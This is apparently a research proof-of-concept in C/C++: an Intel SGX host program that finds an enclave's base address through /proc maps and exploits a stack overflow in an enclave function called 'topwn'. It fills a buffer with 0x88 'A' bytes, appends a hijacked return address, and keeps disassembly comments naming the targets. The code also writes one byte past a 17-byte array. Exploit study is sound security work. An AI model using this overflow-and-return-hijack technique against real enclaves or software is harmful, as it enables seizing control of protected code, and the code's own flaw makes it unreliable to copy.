/*
 * Copyright (C) 2011-2019 Intel Corporation. All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 *   * Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *   * Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in
 *     the documentation and/or other materials provided with the
 *     distribution.
 *   * Neither the name of Intel Corporation nor the names of its
 *     contributors may be used to endorse or promote products derived
 *     from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */


#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <signal.h>

# include <unistd.h>
# include <pwd.h>
# define MAX_PATH FILENAME_MAX

#include "sgx_urts.h"
#include "App.h"
#include "Enclave_u.h"

#include "Utility.h"
#include "Dump.h"
#include "Client.h"

#include "Async_Bucket.h"
#include <pthread.h>

#include <iostream>
using namespace std;

#define MODE "traced"

/* Global EID shared by multiple threads */
sgx_enclave_id_t global_eid = 0;
extern bucket_t bucket;
int actionCounter;

unsigned long getEnclaveBaseAddress();
void add(void*, unsigned long int, size_t*);

int initilize_ra() {

  // for the fucking remote attestation!
  // https://github.com/intel/sgx-ra-sample

  // other peoples with my problems:
  // https://software.intel.com/en-us/forums/intel-software-guard-extensions-intel-sgx/topic/814779

  bootSecureCommunication(global_eid);

  return 0;
}

/* Initialize the enclave:
 *   Call sgx_create_enclave to initialize an enclave instance
 */
int initialize_enclave(void)
{
    sgx_status_t ret = SGX_ERROR_UNEXPECTED;

    /* Call sgx_create_enclave to initialize an enclave instance */
    /* Debug Support: set 2nd parameter to 1 */
    ret = sgx_create_enclave(ENCLAVE_FILENAME, SGX_DEBUG_FLAG, NULL, NULL, &global_eid, NULL);
    if (ret != SGX_SUCCESS) {
        print_error_message(ret);
        return -1;
    }

    return 0;
}

/* OCall functions */
void ocall_print_string(const char *str)
{
    /* Proxy/Bridge will check the length and null-terminate
     * the input string to prevent buffer overflow.
     */
    printf("%s", str);
}

/* Application entry */
int SGX_CDECL main(int argc, char *argv[])
{
    (void)(argc);
    (void)(argv);

    // 0 -> single entries fashion
    if(initialize_client(0) < 0) {
      cout << "Enter a character before exit ..." << endl;
      getchar();
      return -1;
    }

    /* Initialize the enclave */
    if(initialize_enclave() < 0){
      cout << "Enter a character before exit ..." << endl;
      getchar();
      return -1;
    }

    // FIRST PHASE: ANALYSIS OF THE ENCLAVE:
    unsigned long baseAddr = getEnclaveBaseAddress();

    printf("Enclave base address 0x%lx\n", baseAddr);

    if(initilize_ra() < 0) {
      cout << "Enter a character before exit ..." << endl;
      getchar();
      return -1;
    }

    setActionCounter(global_eid, &actionCounter);
    setBucket(global_eid, &bucket);

    char ubuff[] = "hi!!";
    // RUN_AND_DUMP(MODE, "hello1", hello1(global_eid, 1))
    topwn(global_eid, (char*)ubuff, sizeof(ubuff));
    // dumpLen(MODE, "test_exception", &actionCounter);


    uint8_t exploit[500] = {0};
    size_t len = 0;

    for (len = 0; len < 0x88; len++)
      exploit[len] = 'A';

    add(&exploit[len], 0x1e0c + baseAddr, &len);
    
    // return from A() to topwn()
    // 1d1c:       48 8d 05 ad 00 00 00    lea    rax,[rip+0xad]        # 1dd0 <_Z1bPcm>

    // return from A() to B()
    // 1e0c:       48 8b 7d 08             mov    rdi,QWORD PTR [rbp+0x

    // RUN_AND_DUMP(MODE, "hello1", hello1(global_eid, 1))
    topwn(global_eid, (char*)exploit, sizeof(exploit));
    // dumpLen(MODE, "test_exception", &actionCounter);


    makeEndMsg(global_eid);

    /* Destroy the enclave */
    sgx_destroy_enclave(global_eid);

    // pthread_exit(NULL);
    // void *rett;
    // pthread_join(sender, &rett);

    return 0;
}

unsigned long getEnclaveBaseAddress() {
  FILE * fp;
  char * line = NULL;
  size_t len = 100;
  ssize_t read;

  line = (char*)malloc(len);

  pid_t p = getpid();

  char fPath[100] = { 0 };
  //printf("PID = %d\n", p);

  snprintf(fPath, 100, "/proc/%d/maps", p);

  //printf("map file: %s\n", fPath);

  fp = fopen(fPath, "r");
  if (fp == NULL) {
      printf("fail opening: %s\n", fPath);
      free(line);
      exit(EXIT_FAILURE);
  }

  bool atLeastOne = false;
  while ((read = getline(&line, &len, fp)) != -1) {
    if(strstr(line, "isgx") != NULL) {
      atLeastOne = true;
      break;
    }
  }

  fclose(fp);

  if (atLeastOne) {
    // I extract basic address
    printf("There is at least an enclave\n");
    //printf("isgx: %s\n", line);

    char* pEnd = strstr(line, "-");

    char strBaseAddr[17] = { 0 };

    memcpy(strBaseAddr, line, pEnd-line);
    strBaseAddr[17] = {0};

    //printf("Estimaqted base addr: 0x%s\n", strBaseAddr);

    unsigned long baseAddr = (unsigned long)strtol(strBaseAddr, NULL, 16);

    free(line);

    return baseAddr;
  }
  else {
    printf("I didn't find any enclave!\n");
    free(line);
    exit(EXIT_FAILURE);
  }

  free(line);
  exit(EXIT_SUCCESS);
}

void add(void * d, unsigned long int x, size_t *s) {
  memcpy(d, &x, 8);
  if (s)
    *s += sizeof(unsigned long int);
}